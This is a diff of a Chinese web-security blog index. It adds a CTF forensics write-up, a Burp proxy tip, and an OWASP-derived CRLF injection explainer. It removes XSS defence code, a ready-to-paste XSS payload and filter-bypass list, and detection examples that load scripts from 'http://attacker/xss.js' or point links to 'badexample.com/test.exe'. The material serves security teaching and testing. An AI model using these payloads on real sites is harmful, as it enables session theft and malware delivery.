@@ -130,639 +130,192 @@
 		<div class="markdown-body home-categories">
 		
 			<div class="article">
-                <a class="clearlink" href="15483045490779.html">
+                <a class="clearlink" href="15483045491124.html">
                 
-                  <h1>xss基础</h1>
+                  <h1>FOEENSICS 101</h1>
+                  <div class="a-content">
+                      
+                      <div class="a-content-text">
+                        
+                        	<p>题目：<a href="https://ctflearn.com/problems/96">https://ctflearn.com/problems/96</a><br/>
+<img src="http://images.lonelyor.org/ctflearn-96-1.png" alt="ctflearn-96-1"/><br/>
+访问域名，然后会下载一张图片。<br/>
+接下来我们使用十六进制编码器打开这张图片，会发现：<br/>
+<img src="http://images.lonelyor.org/ctflearn-96-2.png" alt="ctflearn-96-2"/><br/>
+标红部分即是flag。</p>
+
+                        
+                      </div>
+                  </div>
+                </a>
+                <div class="read-more clearfix">
+                  <div class="more-left left">
+                  
+                    <span class="date">2019/1/24 12:35 下午</span>
+                    <span>posted in&nbsp;</span> 
+          				  
+          					    <span class="posted-in"><a href='Web%E5%AE%89%E5%85%A8.html'>Web安全</a></span>
+          				   
+                  </div>
+                  <div class="more-right right">
+                  <span class="comments">
+                      
+
+                       
+                  </span>
+                  </div>
+                </div>
+              </div><!-- article -->
+        
+			<div class="article">
+                <a class="clearlink" href="15483045491162.html">
+                
+                  <h1>burpsuite设置上游代理</h1>
                   <div class="a-content">
                       
                       <div class="a-content-text">
                         
                         	<blockquote>
-<p>description: 这里包含了xss的基本定义，原理、及防御方案代码示例。</p>
+<p>burpsuite的使用技巧之一，设置上游代理。比如测试境外网站时可能需要[fanqiang]才能访问，此时这个技巧就能用得上了。</p>
 </blockquote>
 
-<h2 id="toc_0">简介</h2>
+<p><img src="http://images.lonelyor.org/burp%E8%AE%BE%E7%BD%AE%E4%B8%8A%E6%B8%B8%E4%BB%A3%E7%90%8620180823161146.png" alt="burp设置上游代理20180823161146"/></p>
 
-<p>跨站脚本XSS是一种注入类型攻击，攻击者注入恶意代码到web应用程序并发送给不同的最终用户时，就会发生xss攻击，并且可能发生在web应用程序<u>在其生成的输出中使用来之用户的输入</u>并且无需验证或编码它的任何地方。</p>
+<p>1、在浏览器中设置burp代理以保证可以抓包<br/>
+2、开启上游代理<br/>
+3、在burp的图中所示位置设置上游代理</p>
 
-<p>跨站脚本发生在：</p>
+<p>打完收工</p>
+
+<h2 id="toc_0">参考链接</h2>
+
+<p><a href="http://www.360zhijia.com/360anquanke/191737.html">http://www.360zhijia.com/360anquanke/191737.html</a></p>
+
+                        
+                      </div>
+                  </div>
+                </a>
+                <div class="read-more clearfix">
+                  <div class="more-left left">
+                  
+                    <span class="date">2019/1/24 12:35 下午</span>
+                    <span>posted in&nbsp;</span> 
+          				  
+          					    <span class="posted-in"><a href='Web%E5%AE%89%E5%85%A8.html'>Web安全</a></span>
+          				   
+                  </div>
+                  <div class="more-right right">
+                  <span class="comments">
+                      
+
+                       
+                  </span>
+                  </div>
+                </div>
+              </div><!-- article -->
+        
+			<div class="article">
+                <a class="clearlink" href="15483045491221.html">
+                
+                  <h1>CRLF注入</h1>
+                  <div class="a-content">
+                      
+                      <div class="a-content-text">
+                        
+                        	<blockquote>
+<p>文章翻译自OWASP的<a href="https://www.owasp.org/index.php/CRLF_Injection">CRLF_Injection</a></p>
+</blockquote>
+
+<p>CRLF即回车Carriage Return (ASCII 13, \r) 和 换行 Line Feed (ASCII 10, \n)。他们被用于注释掉一行的终止。不过不同系统的处理方式有点不同。windows中，CR和LF都被用于注释掉一行的结尾，而linux/unix中只需要一个LF。在HTTP协议中，CRLF序列始终用于一行的终止。<br/>
+当用户设法将CRLF提交到应用程序时，可能发生CRLF注入攻击，这通常是通过修改HTTP参数或URL来完成。</p>
+
+<p>CRLF注入可能产生这样的问题：</p>
 
 <ul>
-<li>任何可以插入数据，并且数据包会未经恶意内容验证就发送给Web用户的地方。</li>
+<li>HTTP响应拆分</li>
+<li>日志注入<br/>
+## HTTP响应拆分<br/>
+通常，当出现以下情况时会发生HTTP响应拆分</li>
+<li>数据通过不受信任的来源进入Web应用程序，如HTTP请求。</li>
+<li>数据包含在发送给Web用户的HTTP响应标头中，而不会对恶意字符进行验证。<br/>
+HTTP响应拆分是达到目的的手段而不是目的本身。<br/>
+攻击方式如下：攻击者将恶意数据传递给易受攻击的应用程序，应用程序将数据包含在HTTP响应中。<br/>
+要成功利用漏洞，应用程序必须允许<strong>包含有 CR（回车，即 %0d 或者 \r\n）和 LF（换行符，%0a 或者 \n）的输入在header中</strong>和<strong>底层平台必须容易注入这样的字符</strong>。</li>
 </ul>
 
-<p>跨站脚本分为两类：</p>
+<p><em>大多数现代应用程序服务器(无论用什么语言编写的代码)，都已经不存在HTTP响应拆分漏洞。</em></p>
+
+<p>下面上一段java代码来举例说明：</p>
+
+<pre class="line-numbers"><code class="language-java">String author = request.getParameter(AUTHOR_PARAM);
+...
+Cookie cookie = new Cookie(&quot;author&quot;, author);
+      cookie.setMaxAge(cookieExpiration);
+      response.addCookie(cookie);
+</code></pre>
+
+<p>上述代码的意思是：从客户端HTTP请求中接受参数（author），并将其设置在HTTP响应的cookie头中。<br/>
+如果我们正常提交数据(author=lonelyor)，HTTP响应应该是这样：</p>
+
+<pre class="line-numbers"><code class="language-java">HTTP/1.1 200 OK
+...
+Set-Cookie: author=Jane Smith
+...
+</code></pre>
+
+<p>但是，由于源代码中的cookie是由未经验证的用户输入组成的，因此如果我们提交恶意代码<code>Hacker By xxx\r\nContent-Length:45\r\n\r\n...</code>则HTTP响应将被拆分为原始响应和伪造响应。</p>
+
+<pre class="line-numbers"><code class="language-java">HTTP/1.1 200 OK
+    ...
+    Set-Cookie: author=Hacker By xxx
+    Content-Length: 999
+    
+    &lt;html&gt;恶意内容...&lt;/html&gt; (这个例子中为第999个字符)
+    原始内容以1000开头, 现在被浏览器忽略了...
+</code></pre>
+
+<h3 id="toc_0">危害</h3>
+
+<p>攻击者构建任意HTTP响应的能力可能导致以下攻击：<br/>
+跨用户污染（Cross-User_Defacement）——利用条件很苛刻<br/>
+缓存中毒（Cache_Poisoning）——利用条件很苛刻<br/>
+XSS跨站脚本攻击<br/>
+页面劫持</p>
+
+<h2 id="toc_1">日志注入</h2>
+
+<p>将未经验证的用户输入写入日志文件可能导致攻击者伪造日志或者将恶意内容注入日志。<br/>
+以下情况可能导致日志伪造漏洞：</p>
 
 <ul>
-<li>反射型(又称非持久性xss): 反射性xss通常出现在错误消息、搜索结果、或者服务器实时响应部分或全部请求的地方。可以通过电子邮件、恶意链接、等途径进行攻击。</li>
-<li>存储型(又称持久性xss): 存储型xss通常将恶意代码永久存储在目标服务器上，如数据库、消息论坛、访问日志、注释字段等。</li>
-<li>DOM型: dom型xss我觉得也属于存储型，只不过是存储在客户端。有效载荷修改了客户端浏览器中的DOM环境并执行恶意代码，也就是说HTTP响应是不变的，恶意代码被存储在客户端响应页面中。因此很难在服务器端做安全检测。</li>
+<li>数据从不受信任的来源进入应用程序</li>
+<li>数据将写入应用程序或者系统日志文件</li>
 </ul>
 
-<h2 id="toc_1">危害</h2>
+<p>下面上一段java代码来举例说明：</p>
 
-<p>xss可以窃取用户的会话cookie，允许攻击者劫持用户的会话并接管账号，其他攻击包括最终用户文件的泄露、木马程序安装、将用户重定向到其他页面或站点、修改内容的呈现等。</p>
-
-<p>具体危害如：允许攻击者修改新闻稿或新闻项目的XSS漏洞可能会影响公司的股价或降低消费者信心。制药网站上的XSS漏洞可能允许攻击者修改剂量信息，从而导致过量服用。</p>
-
-<h2 id="toc_2">防御</h2>
-
-<p>1、在<strong>输出时</strong>将不可信数据（用户可控的数据：包括主体、属性、JavaScript、CSS或URL）使用 htmlEscape（）进行转义；将html、js中涉及到的关键字符进行html编码处理后再输出到页面上。</p>
-
-<p>2、如果存在用户需要编写文章等功能的时候，类似用户可以自定义页面样式的功能，则需要限制用户的输入，采用严格的<strong>白名单</strong>机制来过滤用户的输入，即非用户允许的功能标签都应该被完全过滤，这种过滤应依赖于后端应用来实现。</p>
-
-<p>3、应注意很多开源的第三方富文本编辑器，部分编辑器仅在JS端进行过滤，而不在后端进行关键字过滤。</p>
-
-<h3 id="toc_3">代码示例</h3>
-
-<p>1.Java<br/>
-<strong>Portal 或 Spring 框架修复方案：</strong></p>
-
-<pre class="line-numbers"><code class="language-java">import org.springframework.web.util.HtmlUtils;
-target = HtmlUtils.htmlEscape(target);
-</code></pre>
-
-<p>// target 参数为需要进行转义的参数，建议在该参数输出前进行转义</p>
-
-<p><strong>通用型修复方案</strong>：</p>
-
-<pre class="line-numbers"><code class="language-java">StringEscapeUtils from Apache Commons Lang:
-
-import static org.apache.commons.lang.StringEscapeUtils.escapeHtml;
-// ...
-String source = &quot;The less than sign (&lt;) and ampersand (&amp;) must be escaped before using them in HTML&quot;;
-String escaped = escapeHtml(source);
-
-
-For version 3:
-
-import static org.apache.commons.lang3.StringEscapeUtils.escapeHtml4;
-// ...
-String escaped = escapeHtml4(source);
-</code></pre>
-
-<p>2.<strong>PHP</strong><br/>
-htmlspecialchars() 在输出时使用该函数转义用户输入的值，尤其注意第二个 flag 参数要使用 ENT_QUOTES</p>
-
-<pre class="line-numbers"><code class="language-php">&lt;?php 
-    $name = $_GET[&quot;name&quot;];
-    $name = htmlspecialchars($name, ENT_QUOTES);
-?&gt;
-</code></pre>
-
-<p>htmlentities() 在输出时使用该函数转义用户输入的值</p>
-
-<p>针对富文本，使用以下过滤类进行处理：</p>
-
-<pre class="line-numbers"><code class="language-php">&lt;?php
-/**
- * PHP 富文本XSS过滤类
- *
- * @package XssHtml
- * @version 1.0.0 
- * @link http://phith0n.github.io/XssHtml
- * @since 20140621
- * @copyright (c) Phithon All Rights Reserved
- *
- */
-
-#
-# Usage: 
-# &lt;?php
-# require(&#39;Xss.php&#39;);
-# $html = &#39;&lt;html code&gt;&#39;;
-# $xss = new XssHtml($html);
-# $html = $xss-&gt;getHtml();
-# ?\&gt;
-# 
-# 需求：
-# PHP Version &gt; 5.0
-# 浏览器版本：IE7+ 或其他浏览器，无法防御IE6及以下版本浏览器中的XSS
-# 更多使用选项见 http://phith0n.github.io/XssHtml
-
-class Xss {
-    private $m_dom;
-    private $m_xss;
-    private $m_ok;
-    private $m_AllowAttr = array(&#39;title&#39;, &#39;src&#39;, &#39;href&#39;, &#39;id&#39;, &#39;class&#39;, &#39;style&#39;, &#39;width&#39;, &#39;height&#39;, &#39;alt&#39;, &#39;target&#39;, &#39;align&#39;);
-    private $m_AllowTag = array(&#39;img&#39;, &#39;br&#39;, &#39;strong&#39;, &#39;b&#39;, &#39;code&#39;, &#39;p&#39;, &#39;div&#39;, &#39;em&#39;, &#39;span&#39;, &#39;h1&#39;, &#39;h2&#39;, &#39;h3&#39;, &#39;h4&#39;, &#39;h5&#39;, &#39;h6&#39;, &#39;table&#39;, &#39;ul&#39;, &#39;ol&#39;, &#39;tr&#39;, &#39;th&#39;, &#39;td&#39;, &#39;hr&#39;, &#39;li&#39;, &#39;u&#39;);
-
-    /**
-     * 构造函数
-     *
-     * @param string $html 待过滤的文本
-     * @param string $charset 文本编码，默认utf-8
-     * @param array $AllowTag 允许的标签，如果不清楚请保持默认，默认已涵盖大部分功能，不要增加危险标签
-     */
-    public function __construct($html, $charset = &#39;utf-8&#39;, $AllowTag = array()){
-        $this-&gt;m_AllowTag = empty($AllowTag) ? $this-&gt;m_AllowTag : $AllowTag;
-        $this-&gt;m_xss = strip_tags($html, &#39;&lt;&#39; . implode(&#39;&gt;&lt;&#39;, $this-&gt;m_AllowTag) . &#39;&gt;&#39;);
-        if (empty($this-&gt;m_xss)) {
-            $this-&gt;m_ok = FALSE;
-            return ;
-        }
-        $this-&gt;m_xss = &quot;&lt;meta http-equiv=\&quot;Content-Type\&quot; content=\&quot;text/html;charset={$charset}\&quot;&gt;&lt;nouse&gt;&quot; . $this-&gt;m_xss . &quot;&lt;/nouse&gt;&quot;;
-        $this-&gt;m_dom = new DOMDocument();
-        $this-&gt;m_dom-&gt;strictErrorChecking = FALSE;
-        $this-&gt;m_ok = @$this-&gt;m_dom-&gt;loadHTML($this-&gt;m_xss);
-    }
-
-    /**
-     * 获得过滤后的内容
-     */
-    public  function getHtml()
-    {
-        if (!$this-&gt;m_ok) {
-            return &#39;&#39;;
-        }
-        $nodeList = $this-&gt;m_dom-&gt;getElementsByTagName(&#39;*&#39;);
-        for ($i = 0; $i &lt; $nodeList-&gt;length; $i++){
-            $node = $nodeList-&gt;item($i);
-            if (in_array($node-&gt;nodeName, $this-&gt;m_AllowTag)) {
-                if (method_exists($this, &quot;__node_{$node-&gt;nodeName}&quot;)) {
-                    call_user_func(array($this, &quot;__node_{$node-&gt;nodeName}&quot;), $node);
-                }else{
-                    call_user_func(array($this, &#39;__node_default&#39;), $node);
-                }
-            }
-        }
-        $html = strip_tags($this-&gt;m_dom-&gt;saveHTML(), &#39;&lt;&#39; . implode(&#39;&gt;&lt;&#39;, $this-&gt;m_AllowTag) . &#39;&gt;&#39;);
-        $html = preg_replace(&#39;/^\n(.*)\n$/s&#39;, &#39;$1&#39;, $html);
-        return $html;
-    }
-
-    private function __true_url($url){
-        if (preg_match(&#39;#^https?://.+#is&#39;, $url)) {
-            return $url;
-        }else{
-            return &#39;http://&#39; . $url;
-        }
-    }
-
-    private function __get_style($node){
-        if ($node-&gt;attributes-&gt;getNamedItem(&#39;style&#39;)) {
-            $style = $node-&gt;attributes-&gt;getNamedItem(&#39;style&#39;)-&gt;nodeValue;
-            $style = str_replace(&#39;\\&#39;, &#39; &#39;, $style);
-            $style = str_replace(array(&#39;&amp;#&#39;, &#39;/*&#39;, &#39;*/&#39;), &#39; &#39;, $style);
-            $style = preg_replace(&#39;#e.*x.*p.*r.*e.*s.*s.*i.*o.*n#Uis&#39;, &#39; &#39;, $style);
-            return $style;
-        }else{
-            return &#39;&#39;;
-        }
-    }
-
-    private function __get_link($node, $att){
-        $link = $node-&gt;attributes-&gt;getNamedItem($att);
-        if ($link) {
-            return $this-&gt;__true_url($link-&gt;nodeValue);
-        }else{
-            return &#39;&#39;;
-        }
-    }
-
-    private function __setAttr($dom, $attr, $val){
-        if (!empty($val)) {
-            $dom-&gt;setAttribute($attr, $val);
-        }
-    }
-
-    private function __set_default_attr($node, $attr, $default = &#39;&#39;)
-    {
-        $o = $node-&gt;attributes-&gt;getNamedItem($attr);
-        if ($o) {
-            $this-&gt;__setAttr($node, $attr, $o-&gt;nodeValue);
-        }else{
-            $this-&gt;__setAttr($node, $attr, $default);
-        }
-    }
-
-    private function __common_attr($node)
-    {
-        $list = array();
-        foreach ($node-&gt;attributes as $attr) {
-            if (!in_array($attr-&gt;nodeName, 
-                $this-&gt;m_AllowAttr)) {
-                $list[] = $attr-&gt;nodeName;
-            }
-        }
-        foreach ($list as $attr) {
-            $node-&gt;removeAttribute($attr);
-        }
-        $style = $this-&gt;__get_style($node);
-        $this-&gt;__setAttr($node, &#39;style&#39;, $style);
-        $this-&gt;__set_default_attr($node, &#39;title&#39;);
-        $this-&gt;__set_default_attr($node, &#39;id&#39;);
-        $this-&gt;__set_default_attr($node, &#39;class&#39;);
-    }
-
-    private function __node_img($node){
-        $this-&gt;__common_attr($node);
-
-        $this-&gt;__set_default_attr($node, &#39;src&#39;);
-        $this-&gt;__set_default_attr($node, &#39;width&#39;);
-        $this-&gt;__set_default_attr($node, &#39;height&#39;);
-        $this-&gt;__set_default_attr($node, &#39;alt&#39;);
-        $this-&gt;__set_default_attr($node, &#39;align&#39;);
-
-    }
-
-    private function __node_a($node){
-        $this-&gt;__common_attr($node);
-        $href = $this-&gt;__get_link($node, &#39;href&#39;);
-
-        $this-&gt;__setAttr($node, &#39;href&#39;, $href);
-        $this-&gt;__set_default_attr($node, &#39;target&#39;, &#39;_blank&#39;);
-    }
-
-    private function __node_embed($node){
-        $this-&gt;__common_attr($node);
-        $link = $this-&gt;__get_link($node, &#39;src&#39;);
-
-        $this-&gt;__setAttr($node, &#39;src&#39;, $link);
-        $this-&gt;__setAttr($node, &#39;allowscriptaccess&#39;, &#39;never&#39;);
-        $this-&gt;__set_default_attr($node, &#39;width&#39;);
-        $this-&gt;__set_default_attr($node, &#39;height&#39;);
-    }
-
-    private function __node_default($node){
-        $this-&gt;__common_attr($node);
-    }
+<pre class="line-numbers"><code class="language-java">...
+String val = request.getParameter(&quot;val&quot;);
+try {
+  int value = Integer.parseInt(val);
 }
-
-?&gt;
+catch (NumberFormatException) {
+  log.info(&quot;Failed to parse val = &quot; + val);
+}
+...
 </code></pre>
 
-                        
-                      </div>
-                  </div>
-                </a>
-                <div class="read-more clearfix">
-                  <div class="more-left left">
-                  
-                    <span class="date">2019/1/24 12:35 下午</span>
-                    <span>posted in&nbsp;</span> 
-          				  
-          					    <span class="posted-in"><a href='Web%E5%AE%89%E5%85%A8.html'>Web安全</a></span>
-          				   
-                  </div>
-                  <div class="more-right right">
-                  <span class="comments">
-                      
+<p>上述代码的功能是，从请求对象中读取整数值，如果该值无法解析为整数，则会记录输入，并显示一条错误信息。<br/>
+如果用户提交字符串“one”，则会记录以下条目<br/>
+<code>INFO: Failed to parse val=one</code><br/>
+然而，如果攻击者提交字符串<code>one%0a%0aINFO:+User+logged+out%3dbadguy</code>则会在日志中显示：</p>
 
-                       
-                  </span>
-                  </div>
-                </div>
-              </div><!-- article -->
-        
-			<div class="article">
-                <a class="clearlink" href="15483045490298.html">
-                
-                  <h1>xss常用payload</h1>
-                  <div class="a-content">
-                      
-                      <div class="a-content-text">
-                        
-                        	<blockquote>
-<p>这是很久之前写的东西了，忘记是从哪里收集总结来的了。抱歉没法贴源地址了。</p>
-</blockquote>
+<pre class="line-numbers"><code class="language-text">    INFO: Failed to parse val=one
 
-<p>在平时的工作中，经常遇到需要手工测试xss漏洞的地方，每次都将代码输入一遍（特别是用手机的时候）会显得比较麻烦，因此写这篇文档来记录一下平时可能用到的xss攻击代码，以备不时之需，复制粘贴总比打字方便一些。以下部分代码收集自网络（全部测试过，可以直接使用）。</p>
-
-<p>xss漏洞是常见的web安全问题之一，当网站未做任何防御时，输入<script>alert(‘xss’)</script>就会弹出上述弹窗。但是通常情况下，网站都会对一些字符进行过滤，以预防xss攻击，这时就需要运用到一些xss绕过技巧。</p>
-
-<p>1.大小写混合绕过<br/>
-顾名思义，通过修改攻击代码大小写进行绕过。虽然javascript对大小写敏感但是html不敏感，javascript操作html的标签不敏感。代码示例：<code>&lt;sCrIpt&gt;alErt(‘xss’)&lt;/ScRiPT&gt;</code></p>
-
-<p>2.闭合标签绕过</p>
-
-<p>单引号很多时候都能起到闭合语句的作用，有时候我们通过关闭标签可以使xss生效。</p>
-
-<p>3.HEX编码来绕过</p>
-
-<p>对语句进行Hex编码，如<code>&lt;script&gt;alert(“xss”);&lt;/script&gt;</code>可以转换为<code>3c7363726970743e616c65727428e2809c787373e2809d293b3c2f7363726970743e</code></p>
-
-<p>4.Javascript URL</p>
-
-<p>链接标签里可以通过在 URL 中使用 javascript:… 来执行 JavaScript：</p>
-
-<p><code>&lt;a href=”javascript:alert(‘test’)”&gt;link&lt;/a&gt;</code></p>
-
-<p>稍微高级一点的写法还有：<code>&lt;a href=”javascript:alert(‘xss’)”&gt;link&lt;/a&gt;</code>，通过url编码使它依旧可以被浏览器执行但又不匹配正则表达式。</p>
-
-<p>5.根据之前绕过方法的启发，我们可以通过修改标签和编码或者函数来修改所用的攻击代码</p>
-
-<p>===&gt;常用代码如下：</p>
-
-<p><code>&lt;script&gt;alert(8888)&lt;/script&gt;</code></p>
-
-<p><code>&lt;img src=1 onerror=alert(1)&gt;</code></p>
-
-<p><code>&lt;script&gt;confirm(8888)&lt;/script&gt;</code></p>
-
-<p><code>&lt;script&gt;prompt(8888)&lt;/script&gt;</code></p>
-
-<p><code>&lt;script&gt;\u0061\u006C\u0065\u0072\u0074(8888)&lt;/script&gt;</code></p>
-
-<p><code>&lt;script src=data:text/javascript,alert(8888)&gt;&lt;/script&gt;</code></p>
-
-<p><code>&lt;script src=&amp;#100&amp;#97&amp;#116&amp;#97:text/javascript,alert(8888)&gt;&lt;/script&gt;</code></p>
-
-<p><code>&lt;script&gt;alert(String.fromCharCode(49,49))&lt;/script&gt;</code></p>
-
-<p><code>&lt;script&gt;alert(/8888/.source)&lt;/script&gt;</code></p>
-
-<p><code>&lt;script&gt;setTimeout(alert(8888),0)&lt;/script&gt;</code></p>
-
-<p>===&gt;以下为触发xss，即鼠标移动到输出的字符上（或点击字符）时，即会引发xss。</p>
-
-<p><code>&lt;anytag onmouseover=alert(1)&gt;h</code></p>
-
-<p><code>&lt;anytag onclick=alert(2)&gt;h</code></p>
-
-<p><code>&lt;a onmouseover=alert(3)&gt;h</code></p>
-
-<p><code>&lt;a onclick=alert(4)&gt;h</code></p>
-
-<p><code>&lt;a href=javascript:alert(5)&gt;h</code></p>
-
-<p><code>&lt;button/onclick=alert(6)&gt;h</code></p>
-
-<p><code>formaction=javascript&amp;colon;alert(7)&gt;h</code></p>
-
-<p><code>&lt;form/action=javascript:alert(8)&gt;&lt;input/type=submit&gt;</code></p>
-
-<p><code>&lt;form onsubmit=alert(9)&gt;&lt;button&gt;h</code></p>
-
-<p><code>&lt;form onsubmit=alert(10)&gt;&lt;button&gt;h</code></p>
-
-<p><code>&lt;img src=x onerror=alert(11)&gt; 29</code></p>
-
-<p><code>&lt;body/onload=alert(12)&gt;</code></p>
-
-<p><code>&lt;body onscroll=alert(13)&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;</code></p>
-
-<p><code>&lt;iframe/onload=alert(document.domain)&gt;&lt;/iframe&gt;</code></p>
-
-<p><code>&lt;IFRAME SRC=”javascript:alert(14);”&gt;&lt;/IFRAME&gt;</code></p>
-
-<p><code>&lt;meta http-equiv=”refresh” content=”0;</code></p>
-
-<p><code>url=data:text/html,&lt;script&gt;alert(15)&lt;/script&gt;”&gt;</code></p>
-
-<p><code>&lt;object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&gt;&lt;/object&gt;</code>　　　　＃此为base64编码，有兴趣可以试试其他编码方式</p>
-
-<p><code>&lt;input onfocus=alert(16) autofocus&gt;</code>　　　　＃使用这行攻击代码会无限弹xss</p>
-
-<p><code>&lt;input onblur=alert(17) autofocus&gt;&lt;input autofocus&gt;</code></p>
-
-                        
-                      </div>
-                  </div>
-                </a>
-                <div class="read-more clearfix">
-                  <div class="more-left left">
-                  
-                    <span class="date">2019/1/24 12:35 下午</span>
-                    <span>posted in&nbsp;</span> 
-          				  
-          					    <span class="posted-in"><a href='Web%E5%AE%89%E5%85%A8.html'>Web安全</a></span>
-          				   
-                  </div>
-                  <div class="more-right right">
-                  <span class="comments">
-                      
-
-                       
-                  </span>
-                  </div>
-                </div>
-              </div><!-- article -->
-        
-			<div class="article">
-                <a class="clearlink" href="15483045490805.html">
-                
-                  <h1>xss检测</h1>
-                  <div class="a-content">
-                      
-                      <div class="a-content-text">
-                        
-                        	<h2 id="toc_0">反射型xss</h2>
-
-<p>1、检测输入向量，确定所有web应用程序的用户定义变量以及如何输入他们，包括显而易见的、http参数、post数据、隐藏的表单字段值等。</p>
-
-<p>2、分析每个输入向量并注入payload以检测潜在的漏洞。</p>
-
-<p>3、分析结果并确定是否存在具有实际影响的漏洞。</p>
-
-<ul>
-<li><p>没有任何防御的情况下</p>
-<p>直接访问即会弹窗</p>
-<pre class="line-numbers"><code class="language-http">http://example.com/index.php?user=&lt;script&gt;alert(123)&lt;/script&gt;
-</code></pre>
-<p>下面这段代码会导致用户单击测试人员提供的链接，即葱他控制的站点下载文件test.exe。</p>
-<pre class="line-numbers"><code class="language-http">http://example.com/index.php?user=&lt;script&gt;window.onload = function() {var AllLinks=document.getElementsByTagName(&quot;a&quot;); 
-AllLinks[0].href = &quot;http://badexample.com/test.exe&quot;; }&lt;/script&gt; 
-</code></pre></li>
-<li><p>标记属性值</p>
-<p>有些情况下可以不使用<code>&lt;script&gt;</code>标签的情况下执行xss漏洞利用，甚至不使用通常过滤的 &lt;&gt; 和 / 等字符。</p>
-<p>例如，Web应用程序可以使用用户输入值来填充属性，如以下代码所示：</p>
-<pre class="line-numbers"><code class="language-javascript">&lt;input type=&quot;text&quot; name=&quot;state&quot; value=&quot;INPUT_FROM_USER&quot;&gt;
-</code></pre>
-<p>然后攻击者可以提交以下代码：</p>
-<pre class="line-numbers"><code class="language-javascript">&quot; onfocus=&quot;alert(document.cookie)
-</code></pre></li>
-<li><p>不同的语法或编码</p>
-<p>通常可以使用这种方法来绕过一些过滤器</p>
-<p>代码示例：</p></li>
-</ul>
-
-<pre class="line-numbers"><code class="language-javascript">  &quot;&gt;&lt;script &gt;alert(document.cookie)&lt;/script &gt;
-  &quot;&gt;&lt;ScRiPt&gt;alert(document.cookie)&lt;/ScRiPt&gt;
-  &quot;%3cscript%3ealert(document.cookie)%3c/script%3e
+    INFO: User logged out=badguy
 </code></pre>
 
-<ul>
-<li><p>绕过非递归过滤器</p>
-<p>有时，过滤器只清理一次，而不是递归执行</p>
-<pre class="line-numbers"><code class="language-javascript">&lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/script&gt;
-</code></pre></li>
-<li><p>包含外部脚本</p>
-<p>现在假设目标站点的开发人员实现了以下代码来保护输入不包含外部脚本：</p></li>
-</ul>
-
-<pre class="line-numbers"><code class="language-text">&lt;?
-   $re = &quot;/&lt;script[^&gt;]+src/i&quot;;
-
-   if (preg_match($re, $_GET[&#39;var&#39;])) 
-   {
-      echo &quot;Filtered&quot;;
-      return; 
-   }
-   echo &quot;Welcome &quot;.$_GET[&#39;var&#39;].&quot; !&quot;;
-?&gt;
-</code></pre>
-
-<p>这种方案中，有一个正则表达式检测是否在 <code>&lt;script</code> 和 <code>&gt;</code> 之间插入了除 src 之外的任何其他内容。这对</p>
-
-<pre class="line-numbers"><code class="language-javascript">&lt;script src=&quot;http://attacker/xss.js&quot;&gt;&lt;/script&gt;
-</code></pre>
-
-<p>这种表达式特别有效。</p>
-
-<p>但是可以使用以下方式绕过：</p>
-
-<pre class="line-numbers"><code class="language-javascript">http://example/?var=&lt;SCRIPT%20a=&quot;&gt;&quot;%20SRC=&quot;http://attacker/xss.js&quot;&gt;&lt;/SCRIPT&gt; 
-</code></pre>
-
-<ul>
-<li>HTTP参数污染(HPP)</li>
-</ul>
-
-<p>这种规避技术包括在具有相同名称的多个参数之间拆分攻击向量。对每个参数值的操纵取决于每个web技术如何解析这些参数，因此这种规避不是总是可行的。</p>
-
-<p>定向攻击代码：</p>
-
-<pre class="line-numbers"><code class="language-javascript">http://example/page.php?param=&lt;script&gt;[...]&lt;/script&gt;
-</code></pre>
-
-<p>使用HPP攻击：</p>
-
-<pre class="line-numbers"><code class="language-javascript">http://example/page.php?param=&lt;script&amp;param=&gt;[...]&lt;/&amp;param=script&gt;
-</code></pre>
-
-<ul>
-<li>通常使用burp的主动扫描，即可检测出大部分情况下的反射型xss，而存储型xss目前还没有比较好的检测方法。</li>
-</ul>
-
-<h2 id="toc_1">存储型xss</h2>
-
-<ul>
-<li><p>输入表格</p></li>
-<li><p>存储型xss能不能成功主要取决于能不能规避过滤器。</p></li>
-<li><p>上传文件</p>
-<p>如果web应用程序允许文件上传，那么检查是否可以上载html内容就很重要。如果允许html或者txt文件，则可以在上载的文件中注入xss有效载荷。还应该验证文件上载是否允许设置任意MIME类型。</p>
-<p>考虑以下用于文件上传的 HTTP POST 请求：</p>
-<pre class="line-numbers"><code class="language-http">POST /fileupload.aspx HTTP/1.1
-[…]<br/>
-Content-Disposition: form-data; name=&quot;uploadfile1&quot;; filename=&quot;C:\Documents and Settings\test\Desktop\test.txt&quot;<br/>
-Content-Type: text/plain<br/>
-test
-</code></pre>
-<p>这种设计缺陷可以在浏览器 MIME 错误处理攻击中利用。例如，像jpg、gif这样的文件可以包含在浏览器加载时执行xss的有效载荷。当images、gif这样的图像的MIME类型可以设置为text/html时，这是可能的。这种情况下，客户端浏览器将文件视为HTML。</p>
-<p>HTTP POST 请求伪造:</p>
-<pre class="line-numbers"><code class="language-http">Content-Disposition: form-data; name=&quot;uploadfile1&quot;; filename=&quot;C:\Documents and Settings\test\Desktop\test.gif&quot;
-Content-Type: text/html<br/>
-&lt;script&gt;alert(document.cookie)&lt;/script&gt;
-</code></pre></li>
-<li><p>测试应用程序如何处理用户输入</p>
-<p>可以执行以下步骤:</p>
-<ul>
-<li>使用前端应用程序并输入带有特殊/无效字符的输入</li>
-<li>分析应用程序响应</li>
-<li>确定输入验证控件存在</li>
-<li>访问后端系统并检查输入是否存储以及如何存储</li>
-<li>分析源代码并了解应用程序如何呈现存储的输入</li>
-</ul></li>
-<li><p>如果源码可用，则应分析输入表单中使用的所有变量，特别是PHP、ASP和JSP等编程语言使用预定义的变量/函数来存储来自HTTP GET和POST请求的输入。</p>
-<p>下表总结了在分析源代码时要查看的一些特殊变量和函数：</p>
-<table>
-<thead>
-<tr>
-<th>语言</th>
-<th>PHP</th>
-<th>ASP</th>
-<th>JSP</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>变量函数</td>
-<td>$_GET —— HTTP GET变量</td>
-<td>Request.QueryString —— HTTP GET</td>
-<td>doGet, doPost servlets —— HTTP GET 和 POST</td>
-</tr>
-<tr>
-<td></td>
-<td>$_POST—— HTTP POST变量</td>
-<td>Request.Form ——  HTTP POST</td>
-<td>request.getParameter —— HTTP GET/POST 变量</td>
-</tr>
-<tr>
-<td></td>
-<td>$_REQUEST —— HTTP POST, GET 和 COOKIE变量</td>
-<td>Server.CreateObject —— 用来上传文件</td>
-<td></td>
-</tr>
-<tr>
-<td></td>
-<td>$_FILES —— HTTP文件上传变量</td>
-<td></td>
-<td></td>
-</tr>
-</tbody>
-</table></li>
-</ul>
